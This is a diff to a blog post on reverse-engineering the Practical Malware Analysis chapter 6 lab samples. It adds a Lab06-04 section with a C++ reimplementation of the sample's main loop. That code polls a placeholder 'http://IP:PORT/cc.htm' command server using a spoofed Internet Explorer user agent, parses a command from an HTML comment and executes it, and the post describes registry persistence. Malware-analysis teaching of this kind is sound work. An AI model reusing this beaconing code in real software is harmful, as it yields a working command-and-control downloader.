@@ -1,9 +1,9 @@
 ---
-title:  "PMA - Going even further: Lab06 (1, 2, 3)"
+title:  "PMA - Going even further: Lab06 (1, 2, 3, 4)"
 date:   2023-11-28 12:00:00 +0300
 classes: wide
 header:
-  teaser: "/assets/images/PMA/lab06-123/lab06-03-main-func.png"
+  teaser: "/assets/images/PMA/lab06-1234/lab06-03-main-func.png"
 ribbon: red
 categories: 
   - PMA
@@ -15,11 +15,11 @@ toc: true
 
 # Introduction
 
-In this post, we'll dive into the first three labs from chapter 6 of the PMA book. This chapter teaches us how to recognize C code constructs in Assembly, which is very important for a reverse engineer.
+In this post, we'll dive into the all labs from chapter 6 of the PMA book. This chapter teaches us how to recognize C code constructs in Assembly, which is very important for a reverse engineer.
 
-Those three labs are an evolution of one another. This makes tools like Bindiff very useful for seeing what changes in each version.
+Those labs are an evolution of one another. This makes tools like Bindiff very useful for seeing what changes in each version.
 
-Today, I will use the demo version of binary ninja disassembly just because I'm deciding whether to flow with Ghdira or buy a license for binja. And yeah, IDA is out of the contest.
+Today, I will use the demo version of **binary ninja** disassembly just because I'm deciding whether to flow with Ghdira or buy a license for binja. And yeah, IDA is out of the contest.
 
 # Lab06-01
 
@@ -27,15 +27,15 @@ This first lab is very simple because it just contains a condition and a functio
 
 The demo version of binja doesn't recognize the program's main function, but it's very easy to find it at the entry point. Basically, I look for the last call instruction with three pushes.
 
-![Finding the main function](/assets/images/PMA/lab06-123/lab06-01-find-the-main.png){:class="img-responsive"}
+![Finding the main function](/assets/images/PMA/lab06-1234/lab06-01-find-the-main.png){:class="img-responsive"}
 
-As I said, the main function contains an if condition that will compare the return value of the function `sub_401000` with zero.
+As I said, the main function contains an *if* condition that will compare the return value of the function `sub_401000` with zero.
 
-![The main function](/assets/images/PMA/lab06-123/lab06-01-main-func.png){:class="img-responsive"}
+![The main function](/assets/images/PMA/lab06-1234/lab06-01-main-func.png){:class="img-responsive"}
 
 So, let's understand the function `sub_401000` and see what it does.
 
-![Check Internet Access](/assets/images/PMA/lab06-123/lab06-01-checkinternetacces-func.png){:class="img-responsive"}
+![Check Internet Access](/assets/images/PMA/lab06-1234/lab06-01-checkinternetacces-func.png){:class="img-responsive"}
 
 By looking at the [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetgetconnectedstate), this function retrieves the states of the local system. And its return values are TRUE if there is an active internet connection and FALSE if doesn't.
 
@@ -76,7 +76,7 @@ Well, as this is the demo version of the binja, I forget that it doesn't allow y
 
 So, after inputting the analyzed binary and doing a diff, it's clear that one more condition was added to the code, as we can see in the below.
 
-![Diff the main function](/assets/images/PMA/lab06-123/lab06-02-main-func.png){:class="img-responsive"}
+![Diff the main function](/assets/images/PMA/lab06-1234/lab06-02-main-func.png){:class="img-responsive"}
 
 By looking at the APIs used in the function at `sub_401040`, it's easy to say that it may read some file content from the URL (http://www[.practicalmalwareanalysisc.]com/cc.htm). After reading the content, the malware tries to parse a HTML comment from the `.htm` file that starts with `<!--`. 
 
@@ -145,9 +145,9 @@ The reimplementation of this code looks like this:
 
 # Lab06-03
 
-In the third lab, we can see a new function (`sub_401130`) added in the main. Inside this function, we can see that it performs the action from the command received by the previous function. This function uses the switch case statement to validate between (a, b, c, d, and e) commands.
+In the third lab, we can see a new function `sub_401130` added in the main. Inside this function, we can see that it performs the action from the command received by the previous function. This function uses the switch case statement to validate between (a, b, c, d, and e) commands.
 
-![Lab06-03 diff with Lab06-02 main fuction](/assets/images/PMA/lab06-123/lab06-03-main-func.png){:class="img-responsive"}
+![Lab06-03 diff with Lab06-02 main fuction](/assets/images/PMA/lab06-1234/lab06-03-main-func.png){:class="img-responsive"}
 
 The behavior of each command are described below:
 - a - creates a directory named `Temp` on the root dir of the system
@@ -156,7 +156,7 @@ The behavior of each command are described below:
 - d - set its persistence mechanism by creating a registry key with the name `Malware`
 - e - sleeps for 100000 milliseconds
 
-![Exec Command function](/assets/images/PMA/lab06-123/lab03-03-exec-command.png){:class="img-responsive"}
+![Exec Command function](/assets/images/PMA/lab06-1234/lab03-03-exec-command.png){:class="img-responsive"}
 
 My reimplementation of this code looks like this:
 
@@ -221,7 +221,86 @@ My reimplementation of this code looks like this:
     result = GetLastError();
     return result;
   }
+```
 
+# Lab06-04
+
+In this last lab, the most significant difference was in the main function with a *for* loop that will interact for 1440 minutes (24 hours), and in each interaction, the malware will pass as argument to the mw_GetCommandFromInternet function that will be used to be placed in the user-agent `"Internet Explorer 7.50/pma%d"` with the `_sprintf` function.
+
+![Main function](/assets/images/PMA/lab06-1234/lab06-04-main-func.png){:class="img-responsive"} 
+![GetCommandFromInternet function](/assets/images/PMA/lab06-1234/lab06-04-getcommandfrominternet-func.png){:class="img-responsive"}
+
+```cpp
+  int main(int argc, char* argv[], char* envp[])
+  {
+    if (CheckInternetAccess() != 0)
+    {
+      for (int i = 0; i < 1440; i++)
+      {
+        char cmd = GetCommandFromInternet(i);
+        if ((int)cmd != 0)
+        {
+          printf_s("Success: Parsed command is \"%c\"\n", cmd);
+          ExecCommand(cmd, (PSTR)argv[0]);
+          Sleep(0xEA60);
+        }
+      }
+    }
+    return ERROR_SUCCESS;
+  }
+
+  char GetCommandFromInternet(int x)
+  {
+    HINTERNET hInet = nullptr;
+    HINTERNET hGetUrl = nullptr;
+
+    BOOL status = FALSE;
+
+    char* buffer = new char[512];
+    DWORD size;
+    
+    char user_agent[28];
+    sprintf_s(user_agent, sizeof(user_agent), "Internet Explorer 7.50/pma%d", x);
+
+    hInet = InternetOpenA(user_agent, 0, nullptr, nullptr, 0);
+    hGetUrl = InternetOpenUrlA(hInet, "http://IP:PORT/cc.htm", nullptr, 0, 0, 0);
+    if (hGetUrl == NULL)
+    {
+      printf_s("Error 2.1: Fail to OpenUrl\n");
+      InternetCloseHandle(hInet);
+      status = FALSE;
+    }
+    else if (!InternetReadFile(hGetUrl, buffer, 512, &size))
+    {
+      printf_s("Error 2.2: Fail to ReadFile\n");
+      InternetCloseHandle(hInet);
+      InternetCloseHandle(hGetUrl);
+      status = FALSE;
+    }
+    else if (buffer[0] != '<')
+    {
+    _FailedCommand:
+      printf_s("Error 2.3: Fail to get command\n");
+      status = FALSE;
+    }
+    else
+    {
+      if (buffer[1] != '!')
+        goto _FailedCommand;
+
+      if (buffer[2] != '-')
+        goto _FailedCommand;
+
+      if (buffer[3] != '-')
+        goto _FailedCommand;
+
+      status = buffer[4];
+    }
+
+    delete[] buffer;
+
+    return (char)status;
+  }
 ```
 
 # Yara rules
